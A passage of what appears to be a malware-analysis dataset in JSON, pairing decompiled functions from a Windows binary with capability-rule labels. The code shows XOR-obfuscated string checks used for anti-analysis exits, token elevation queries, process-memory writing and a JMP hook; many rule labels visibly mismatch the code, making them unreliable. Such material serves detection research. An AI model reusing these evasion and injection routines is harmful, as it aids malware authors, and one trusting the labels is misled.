var_207h = 0x22;\n    var_206h = 0x3e;\n    var_205h = 0x1a;\n    var_204h = 0x25;\n    var_203h = 0x5a;\n    var_f0h[0] = 0x4f;\n    var_f0h[1] = 0x51;\n    var_f0h[2] = 0x57;\n    var_f0h[3] = 0x75;\n    var_ech = 0x4b;\n    var_ebh = 0x5a;\n    fcn.004012a0(0x12);\n    for (var_2ch = 0; var_2ch < 0x12; var_2ch = var_2ch + 1) {\n        fcn.00401280(var_2ch, *(&var_214h + var_2ch) ^ var_f0h[var_2ch % 6]);\n    }\n    uVar7 = 0x400;\n    uVar6 = 0x437fa8;\n    uVar3 = fcn.00401270();\n    uVar4 = fcn.00401270();\n    cVar1 = fcn.00413800(uVar4, uVar3, uVar6, uVar7);\n    if (cVar1 == '\\0') {\n        fcn.00411b90();\n    }\n    var_e0h._0_1_ = 3;\n    var_e0h._1_1_ = 0x78;\n    var_e0h._2_1_ = 10;\n    var_e0h._3_1_ = 0x58;\n    var_dch = 0x44;\n    var_d8h._0_1_ = 0x42;\n    var_d8h._1_1_ = 0x35;\n    var_d8h._2_1_ = 0x43;\n    var_d8h._3_1_ = 0x78;\n    var_d4h = 0x44;\n    fcn.004012a0(5);\n    for (var_30h = 0; var_30h < 5; var_30h = var_30h + 1) {\n        fcn.00401280(var_30h, *(&var_e0h + var_30h) ^ *(&var_d8h + var_30h % 5));\n    }\n    var_120h._0_1_ = 0x18;\n    var_120h._1_1_ = 10;\n    var_120h._2_1_ = 0x70;\n    var_120h._3_1_ = 0x12;\n    var_11ch = 0x24;\n    var_11bh = 0x5a;\n    var_d0h._0_1_ = 0x5a;\n    var_d0h._1_1_ = 0x45;\n    var_d0h._2_1_ = 0x33;\n    var_d0h._3_1_ = 0x5a;\n    var_cch = 0x77;\n    fcn.004012a0(6);\n    for (var_34h = 0; var_34h < 6; var_34h = var_34h + 1) {\n        fcn.00401280(var_34h, *(&var_120h + var_34h) ^ *(&var_d0h + var_34h % 5));\n    }\n    var_c8h._0_1_ = 0x24;\n    var_c8h._1_1_ = 0x17;\n    var_c8h._2_1_ = 0x17;\n    var_c8h._3_1_ = 1;\n    var_c4h = 0x34;\n    var_128h._0_1_ = 0x72;\n    var_128h._1_1_ = 0x55;\n    var_128h._2_1_ = 0x58;\n    var_128h._3_1_ = 0x59;\n    var_124h = 0x34;\n    var_123h = 0x67;\n    fcn.004012a0(5);\n    for (var_38h = 0; var_38h < 5; var_38h = var_38h + 1) {\n        fcn.00401280(var_38h, *(&var_c8h + var_38h) ^ *(&var_128h + var_38h % 6));\n    }\n    var_c0h._0_1_ = 100;\n    var_c0h._1_1_ = 0x74;\n    var_c0h._2_1_ = 0x27;\n    var_c0h._3_1_ = 0x19;\n    var_bch = 0x30;\n    var_b8h._0_1_ = 0x35;\n    var_b8h._1_1_ = 0x31;\n    var_b8h._2_1_ = 0x6a;\n    var_b8h._3_1_ = 0x4c;\n    var_b4h = 0x30;\n    fcn.004012a0(5);\n    for (var_3ch = 0; var_3ch < 5; var_3ch = var_3ch + 1) {\n        fcn.00401280(var_3ch, *(&var_c0h + var_3ch) ^ *(&var_b8h + var_3ch % 5));\n    }\n    var_b0h._0_1_ = 100;\n    var_b0h._1_1_ = 0x37;\n    var_b0h._2_1_ = 0x25;\n    var_b0h._3_1_ = 0x24;\n    var_ach = 0x30;\n    var_130h._0_1_ = 0x37;\n    var_130h._1_1_ = 0x7a;\n    var_130h._2_1_ = 0x66;\n    var_130h._3_1_ = 0x6d;\n    var_12ch = 0x30;\n    var_12bh = 0x62;\n    fcn.004012a0(5);\n    for (var_40h = 0; var_40h < 5; var_40h = var_40h + 1) {\n        fcn.00401280(var_40h, *(&var_b0h + var_40h) ^ *(&var_130h + var_40h % 6));\n    }\n    var_1c4h._0_1_ = 0x3c;\n    var_1c4h._1_1_ = 0x26;\n    var_1c4h._2_1_ = 0x25;\n    var_1c4h._3_1_ = 0x13;\n    var_1c0h = 6;\n    var_1bfh = 0x61;\n    var_1beh = 0x55;\n    var_1bdh = 0x45;\n    var_1bch = 0x51;\n    var_1bbh = 0x60;\n    var_1bah = 0x7a;\n    var_1b9h = 0x75;\n    var_1b8h = 0x45;\n    var_1b7h = 0x58;\n    var_1b6h = 0x41;\n    var_1b5h = 0x66;\n    var_1b4h = 0x4a;\n    var_138h._0_1_ = 0x75;\n    var_138h._1_1_ = 0x68;\n    var_138h._2_1_ = 0x71;\n    var_138h._3_1_ = 0x56;\n    var_134h = 0x4a;\n    var_133h = 0x41;\n    fcn.004012a0(0x11);\n    for (var_44h = 0; var_44h < 0x11; var_44h = var_44h + 1) {\n        fcn.00401280(var_44h, *(&var_1c4h + var_44h) ^ *(&var_138h + var_44h % 6));\n    }\n    var_168h[0] = 0x7f;\n    var_168h[1] = 0x3e;\n    var_168h[2] = 10;\n    var_168h[3] = 0x32;\n    var_164h = 0x47;\n    var_163h = 8;\n    var_162h = 0x6a;\n    var_90h._0_1_ = 0x39;\n    var_90h._1_1_ = 0x6a;\n    var_90h._2_1_ = 0x44;\n    var_90h._3_1_ = 0x66;\n    var_8ch = 0x6a;\n    fcn.004012a0(7);\n    for (var_48h = 0; var_48h < 7; var_48h = var_48h + 1) {\n        fcn.00401280(var_48h, var_168h[var_48h] ^ *(&var_90h + var_48h % 5));\n    }\n    var_a8h._0_1_ = 0x3d;\n    var_a8h._1_1_ = 0x25;\n    var_a8h._2_1_ = 0x3d;\n    var_a8h._3_1_ = 0;\n    var_a4h = 0x36;\n    var_140h._0_1_ = 0x6e;\n    var_140h._1_1_ = 0x6a;\n    var_140h._2_1_ = 0x73;\n    var_140h._3_1_ = 0x49;\n    var_13ch = 0x36;\n    var_13bh = 0x34;\n    fcn.004012a0(5);\n    for (var_4ch = 0; var_4ch < 5; var_4ch = var_4ch + 1) {\n        fcn.00401280(var_4ch, *(&var_a8h + var_4ch) ^ *(&var_140h + var_4ch % 6));\n    }\n    *0x4383ac = fcn.00401270();\n    *0x4383b4 = fcn.00401270();\n    *0x4383b8 = fcn.00401270();\n    *0x4383bc = fcn.00401270();\n    *0x4383c0 = fcn.00401270();\n    *0x4383c4 = fcn.00401270();\n    *0x4383c8 = fcn.00401270();\n    *0x4383cc = fcn.00401270();\n    for (var_68h = 0; var_68h < 8; var_68h = var_68h + 1) {\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x437fa8, *(var_68h * 4 + 0x4383ac));\n        if (iVar2 != 0) {\n            fcn.00411b90();\n        }\n    }\n    var_1d8h[0] = 0x25;\n    var_1d8h[1] = 0x10;\n    var_1d8h[2] = 0x26;\n    var_1d8h[3] = 0xb;\n    var_1d4h = 0x2d;\n    var_1d3h = 0x31;\n    var_1d2h = 0x10;\n    var_1d1h = 0x2d;\n    var_1d0h = 0x1d;\n    var_1cfh = 0x14;\n    var_1ceh = 0x16;\n    var_1cdh = 0xb;\n    var_1cch = 0x31;\n    var_1cbh = 7;\n    var_1cah = 0x2d;\n    var_1c9h = 0x1d;\n    var_1c8h = 0x79;\n    var_a0h._0_1_ = 0x73;\n    var_a0h._1_1_ = 0x79;\n    var_a0h._2_1_ = 0x42;\n    var_a0h._3_1_ = 0x6e;\n    var_9ch = 0x42;\n    fcn.004012a0(0x11);\n    for (var_50h = 0; var_50h < 0x11; var_50h = var_50h + 1) {\n        fcn.00401280(var_50h, var_1d8h[var_50h] ^ *(&var_a0h + var_50h % 5));\n    }\n    uVar7 = 0x400;\n    uVar6 = 0x437fa8;\n    uVar3 = fcn.00401270();\n    uVar4 = fcn.00401270();\n    cVar1 = fcn.00413800(uVar4, uVar3, uVar6, uVar7);\n    if (cVar1 == '\\0') {\n        fcn.00411b90();\n    }\n    var_18ch[0] = 0x31;\n    var_18ch[1] = 0x3a;\n    var_18ch[2] = 4;\n    var_18ch[3] = 0x26;\n    var_188h = 0x12;\n    var_187h = 0x16;\n    var_186h = 0xb;\n    var_185h = 0x11;\n    var_184h = 0x19;\n    var_183h = 0x2a;\n    var_182h = 0x67;\n    var_148h._0_1_ = 0x67;\n    var_148h._1_1_ = 0x53;\n    var_148h._2_1_ = 0x76;\n    var_148h._3_1_ = 0x52;\n    var_144h = 0x67;\n    var_143h = 0x77;\n    fcn.004012a0(0xb);\n    for (var_54h = 0; var_54h < 0xb; var_54h = var_54h + 1) {\n        fcn.00401280(var_54h, var_18ch[var_54h] ^ *(&var_148h + var_54h % 6));\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x437fa8, uVar3);\n    if (iVar2 != 0) {\n        fcn.00411b90();\n    }\n    var_2a4h._0_1_ = 0x1d;\n    var_2a4h._1_1_ = 10;\n    var_2a4h._2_1_ = 0x34;\n    var_2a4h._3_1_ = 0x12;\n    var_2a0h = 0x21;\n    var_29fh = 0x22;\n    var_29eh = 0x1c;\n    var_29dh = 0;\n    var_29ch = 0x2e;\n    var_29bh = 0xb;\n    var_29ah = 0x1f;\n    var_299h = 0;\n    var_298h = 0x3c;\n    var_297h = 0x2a;\n    var_296h = 1;\n    var_295h = 0x29;\n    var_294h = 0x10;\n    var_293h = 0x17;\n    var_292h = 0x12;\n    var_291h = 0x12;\n    var_290h = 0x1b;\n    var_28fh = 0x28;\n    var_28eh = 0x12;\n    var_28dh = 0xc;\n    var_28ch = 0x39;\n    var_28bh = 0x36;\n    var_28ah = 0x2e;\n    var_289h = 5;\n    var_288h = 3;\n    var_287h = 0x11;\n    var_286h = 0x3c;\n    var_285h = 0x20;\n    var_284h = 0x1c;\n    var_283h = 0x32;\n    var_282h = 0x20;\n    var_281h = 6;\n    var_280h = 0x3c;\n    var_27fh = 0x36;\n    var_27eh = 0x1b;\n    var_27dh = 0x29;\n    var_27ch = 0x18;\n    var_27bh = 99;\n    var_150h._0_1_ = 0x4e;\n    var_150h._1_1_ = 0x45;\n    var_150h._2_1_ = 0x72;\n    var_150h._3_1_ = 0x46;\n    var_14ch = 0x76;\n    var_14bh = 99;\n    fcn.004012a0(0x2a);\n    for (var_58h = 0; var_58h < 0x2a; var_58h = var_58h + 1) {\n        fcn.00401280(var_58h, *(&var_2a4h + var_58h) ^ *(&var_150h + var_58h % 6));\n    }\n    uVar7 = 0x400;\n    uVar6 = 0x437fa8;\n    uVar3 = fcn.00401270();\n    uVar4 = fcn.00401270();\n    cVar1 = fcn.00413800(uVar4, uVar3, uVar6, uVar7);\n    if (cVar1 == '\\0') {\n        fcn.00411b90();\n    }\n    var_22ch._0_1_ = 0x79;\n    var_22ch._1_1_ = 0x45;\n    var_22ch._2_1_ = 1;\n    var_22ch._3_1_ = 0x73;\n    var_228h = 2;\n    var_227h = 0x61;\n    var_226h = 0x46;\n    var_225h = 7;\n    var_224h = 0x74;\n    var_223h = 0x1b;\n    var_222h = 0x7e;\n    var_221h = 0x46;\n    var_220h = 4;\n    var_21fh = 0x77;\n    var_21eh = 6;\n    var_21dh = 0x7a;\n    var_21ch = 0x44;\n    var_21bh = 0x1e;\n    var_21ah = 0x76;\n    var_219h = 5;\n    var_218h = 0x75;\n    var_217h = 0x45;\n    var_216h = 3;\n    var_215h = 0x44;\n    var_98h._0_1_ = 0x4c;\n    var_98h._1_1_ = 0x70;\n    var_98h._2_1_ = 0x33;\n    var_98h._3_1_ = 0x44;\n    var_94h = 0x36;\n    fcn.004012a0(0x18);\n    for (var_5ch = 0; var_5ch < 0x18; var_5ch = var_5ch + 1) {\n        fcn.00401280(var_5ch, *(&var_22ch + var_5ch) ^ *(&var_98h + var_5ch % 5));\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x437fa8, uVar3);\n    if (iVar2 != 0) {\n        fcn.00411b90();\n    }\n    var_244h._0_1_ = 0x73;\n    var_244h._1_1_ = 0x50;\n    var_244h._2_1_ = 0x55;\n    var_244h._3_1_ = 0x4d;\n    var_240h = 0x5e;\n    var_23fh = 0x58;\n    var_23eh = 0x72;\n    var_23dh = 0x52;\n    var_23ch = 0x55;\n    var_23bh = 0x58;\n    var_23ah = 0x5a;\n    var_239h = 0x44;\n    var_238h = 0x73;\n    var_237h = 0x51;\n    var_236h = 0x51;\n    var_235h = 0x46;\n    var_234h = 0x5e;\n    var_233h = 0x58;\n    var_232h = 0x76;\n    var_231h = 0x55;\n    var_230h = 0x54;\n    var_22fh = 0x44;\n    var_22eh = 0x59;\n    var_22dh = 0x75;\n    var_158h._0_1_ = 0x44;\n    var_158h._1_1_ = 0x66;\n    var_158h._2_1_ = 0x61;\n    var_158h._3_1_ = 0x75;\n    var_154h = 0x69;\n    var_153h = 0x75;\n    fcn.004012a0(0x18);\n    for (var_60h = 0; var_60h < 0x18; var_60h = var_60h + 1) {\n        fcn.00401280(var_60h, *(&var_244h + var_60h) ^ *(&var_158h + var_60h % 6));\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x437fa8, uVar3);\n    if (iVar2 != 0) {\n        fcn.00411b90();\n    }\n    var_25ch[0] = 7;\n    var_25ch[1] = 100;\n    var_25ch[2] = 0x65;\n    var_25ch[3] = 0x7a;\n    var_258h = 0x53;\n    var_257h = 0x19;\n    var_256h = 3;\n    var_255h = 0x61;\n    var_254h = 0x66;\n    var_253h = 0x6f;\n    var_252h = 0x5c;\n    var_251h = 0;\n    var_250h = 2;\n    var_24fh = 0x6b;\n    var_24eh = 0x68;\n    var_24dh = 0x77;\n    var_24ch = 0x51;\n    var_24bh = 0x19;\n    var_24ah = 2;\n    var_249h = 0x60;\n    var_248h = 0x67;\n    var_247h = 0x73;\n    var_246h = 0x50;\n    var_245h = 0x34;\n    var_160h[0] = 0x30;\n    var_160h[1] = 0x52;\n    var_160h[2] = 0x51;\n    var_160h[3] = 0x42;\n    var_15ch = 100;\n    var_15bh = 0x34;\n    fcn.004012a0(0x18);\n    for (var_64h = 0; var_64h < 0x18; var_64h = var_64h + 1) {\n        fcn.00401280(var_64h, var_25ch[var_64h] ^ var_160h[var_64h % 6]);\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x437fa8, uVar3);\n    if (iVar2 != 0) {\n        fcn.00411b90();\n    }\n    var_1h._0_1_ = 0;\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    uVar5 = fcn.004012d0();\n    return uVar5 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 12740
    },
    "00411c90": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00411c90(uint32_t arg_8h)\n\n{\n    return arg_8h >> 0x18 | arg_8h >> 8 & 0xff00 | (arg_8h & 0xff00) << 8 | arg_8h << 0x18;\n}\n",
        "token_count": 73
    },
    "0041e980": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint fcn.0041e980(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    uint32_t var_4h;\n    \n    TokenInformation = 0;\n    var_4h = (*0x436b6c & 0xffff) == 6;\n    if (var_4h != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 206
    },
    "00419ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00419ff0(uint pszFirst)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uchar var_1ch;\n    uchar var_1bh;\n    uchar var_1ah;\n    uchar var_19h;\n    uint8_t var_18h [4];\n    uchar var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_30h._0_1_ = 100;\n    var_30h._1_1_ = 0x45;\n    var_30h._2_1_ = 0x59;\n    var_30h._3_1_ = 0x77;\n    var_2ch = 0x15;\n    var_2bh = 0x49;\n    var_2ah = 0x20;\n    var_29h = 0x74;\n    var_28h = 0x1e;\n    var_27h = 0x67;\n    var_26h = 0x27;\n    var_25h = 0x45;\n    var_24h = 7;\n    var_23h = 0x77;\n    var_22h = 0x13;\n    var_21h = 0x49;\n    var_20h = 0x24;\n    var_1fh = 0x74;\n    var_1eh = 0x1b;\n    var_1dh = 0x67;\n    var_1ch = 0x25;\n    var_1bh = 0x45;\n    var_1ah = 0x74;\n    var_19h = 0x77;\n    var_18h[0] = 0x49;\n    var_18h[1] = 0x45;\n    var_18h[2] = 0x74;\n    var_18h[3] = 0x77;\n    var_14h = 0x67;\n    fcn.004012a0(0x30);\n    for (var_4h = 0; var_4h < 0x18; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_30h + var_4h) ^ var_18h[var_4h % 5]);\n    }\n    uVar1 = fcn.00401270();\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, uVar1);\n    var_ch = iVar2 != 0;\n    var_10h = var_ch;\n    fcn.004012d0();\n    return var_10h;\n}\n",
        "token_count": 747
    },
    "0041a100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0041a100(uint pszFirst)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uchar var_1ch;\n    uchar var_1bh;\n    uint8_t var_18h [4];\n    uchar var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_30h._0_1_ = 0x10;\n    var_30h._1_1_ = 0x4d;\n    var_30h._2_1_ = 0x4e;\n    var_30h._3_1_ = 0x72;\n    var_2ch = 0x6e;\n    var_2bh = 0x30;\n    var_2ah = 0x3e;\n    var_29h = 99;\n    var_28h = 0x17;\n    var_27h = 0x43;\n    var_26h = 0x42;\n    var_25h = 0x4d;\n    var_24h = 0x15;\n    var_23h = 0x72;\n    var_22h = 0x2a;\n    var_21h = 0x30;\n    var_20h = 0x2e;\n    var_1fh = 99;\n    var_1eh = 0x17;\n    var_1dh = 0x43;\n    var_1ch = 0x30;\n    var_1bh = 0x4d;\n    var_18h[0] = 0x30;\n    var_18h[1] = 0x4d;\n    var_18h[2] = 99;\n    var_18h[3] = 0x72;\n    var_14h = 0x43;\n    fcn.004012a0(0x2c);\n    for (var_4h = 0; var_4h < 0x16; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_30h + var_4h) ^ var_18h[var_4h % 5]);\n    }\n    uVar1 = fcn.00401270();\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, uVar1);\n    var_ch = iVar2 != 0;\n    var_10h = var_ch;\n    fcn.004012d0();\n    return var_10h;\n}\n",
        "token_count": 717
    },
    "00422230": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00422230(void)\n\n{\n    uint uVar1;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uint var_14h;\n    uchar var_10h;\n    uchar var_fh;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(50000);\n    var_14h._0_1_ = 0x2a;\n    var_14h._1_1_ = 0xb;\n    var_14h._2_1_ = 0x26;\n    var_14h._3_1_ = 0x46;\n    var_10h = 0x7e;\n    var_fh = 0x73;\n    var_1ch._0_1_ = 0x65;\n    var_1ch._1_1_ = 0x4c;\n    var_1ch._2_1_ = 0x61;\n    var_1ch._3_1_ = 0x66;\n    var_18h = 0x4e;\n    var_17h = 0x73;\n    fcn.004012a0(6);\n    for (var_4h = 0; var_4h < 6; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_14h + var_4h) ^ *(&var_1ch + var_4h % 6));\n    }\n    uVar1 = fcn.00401270();\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(uVar1);\n    var_ch = 0;\n    fcn.004012d0();\n    return var_ch;\n}\n",
        "token_count": 415
    },
    "00410ca0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.00410ca0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    for (var_8h = 0; var_8h < 0xe3; var_8h = var_8h + 1) {\n        uVar1 = *(var_8h * 4 + 0x436c14);\n        *(var_8h * 4 + 0x436c10) =\n             (*(var_8h * 4 + 0x436c10) & 0x80000000 | uVar1 & 0x7fffffff) >> 1 ^ *(var_8h * 4 + 0x437244) ^ uVar1 & 1;\n    }\n    for (; var_8h < 0x26f; var_8h = var_8h + 1) {\n        uVar1 = *(var_8h * 4 + 0x436c14);\n        *(var_8h * 4 + 0x436c10) =\n             (*(var_8h * 4 + 0x436c10) & 0x80000000 | uVar1 & 0x7fffffff) >> 1 ^ *(var_8h * 4 + 0x436884) ^ uVar1 & 1;\n    }\n    *0x4375cc = (*0x4375cc & 0x80000000 | *0x436c10 & 0x7fffffff) >> 1 ^ *0x437240 ^ *0x436c10 & 1;\n    for (var_ch = 0; var_ch < 0x270; var_ch = var_ch + 1) {\n        uVar1 = *(var_ch * 4 + 0x436c10);\n        uVar1 = uVar1 >> 0xb ^ uVar1;\n        uVar1 = (uVar1 & 0x13a58ad) << 7 ^ uVar1;\n        uVar1 = (uVar1 & 0x1df8c) << 0xf ^ uVar1;\n        *(var_ch * 4 + 0x4375d0) = uVar1 >> 0x12 ^ uVar1;\n    }\n    *0x437f90 = 0;\n    return;\n}\n",
        "token_count": 531
    },
    "00413ae0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nuint fcn.00413ae0(void)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_20h = 0xaea3ed09;\n    var_1ch = 0x2993125a;\n    var_18h = 0x3d75a3ff;\n    var_14h = 0x662d9d39;\n    var_10h = 0x922df04;\n    var_ch = 0xc84f40f0;\n    var_8h = 0xdcfc6e80;\n    var_4h = 0;\n    while( true ) {\n        if (6 < var_4h) {\n            return 1;\n        }\n        var_20h = (&var_20h)[var_4h];\n        iVar1 = fcn.00417810(var_20h);\n        if (iVar1 == 0) break;\n        var_4h = var_4h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 289
    },
    "0041e180": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e180(int32_t arg_8h)\n\n{\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while( true ) {\n        if (6 < var_4h) {\n            return 0;\n        }\n        if (*(var_4h * 4 + 0x4258ac) == arg_8h) break;\n        var_4h = var_4h + 1;\n    }\n    return 1;\n}\n",
        "token_count": 111
    },
    "00420020": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/3c11c79f25554a4cae0a51d287295f58"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00420020(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    for (var_8h = 0; var_8h < arg_ch; var_8h = var_8h + 1) {\n        var_4h = *(arg_8h + var_8h) + (var_4h << 0x13 | var_4h >> 0xd);\n    }\n    return var_4h;\n}\n",
        "token_count": 136
    },
    "00401080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401080(int32_t arg_8h)\n\n{\n    int32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n        if (*(var_4h * 0xc + 0x436698) == arg_8h) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*(var_4h * 0xc + 0x43669c));\n            *(var_4h * 0xc + 0x436698) = 0;\n            *(var_4h * 0xc + 0x43669c) = 0;\n            *(var_4h * 0xc + 0x4366a0) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "004012a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004012a0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, arg_8h + 1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    *in_ECX = uVar1;\n    return in_ECX;\n}\n",
        "token_count": 107
    },
    "004012f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004012f0(uint *SecurityDescriptor, uint StringSecurityDescriptor)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    *SecurityDescriptor = 0xc;\n    SecurityDescriptor[2] = 0;\n    SecurityDescriptor[1] = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)\n                      (StringSecurityDescriptor, 1, SecurityDescriptor + 1, 0, 1);\n    return uVar1;\n}\n",
        "token_count": 133
    },
    "00401850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401850(int32_t *arg_8h)\n\n{\n    *arg_8h = *arg_8h * 0x19660d + 0x3c6ef35f;\n    return *arg_8h;\n}\n",
        "token_count": 61
    },
    "004040c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004040c0(uint hProcess, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t lpBaseAddress;\n    \n    lpBaseAddress = 0;\n    while( true ) {\n        if (arg_14h <= lpBaseAddress) {\n            return 1;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                          (hProcess, arg_ch + lpBaseAddress, arg_10h + lpBaseAddress, 1, 0);\n        if (iVar1 == 0) break;\n        lpBaseAddress = lpBaseAddress + 1;\n    }\n    return 0;\n}\n",
        "token_count": 162
    },
    "00404150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404150(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    fcn.00404110(arg_8h, 0xe9);\n    fcn.00404130(arg_8h + 1, (arg_ch - arg_10h) + -5);\n    return;\n}\n",
        "token_count": 82
    },
    "004110e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __fastcall fcn.004110e0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0x437f90 == 0x270) {\n        fcn.00410ca0(param_1);\n        *0x437f90 = 0;\n    }\n    iVar1 = *0x437f90 * 4;\n    *0x437f90 = *0x437f90 + 1;\n    return *(iVar1 + 0x4375d0);\n}\n",
        "token_count": 135
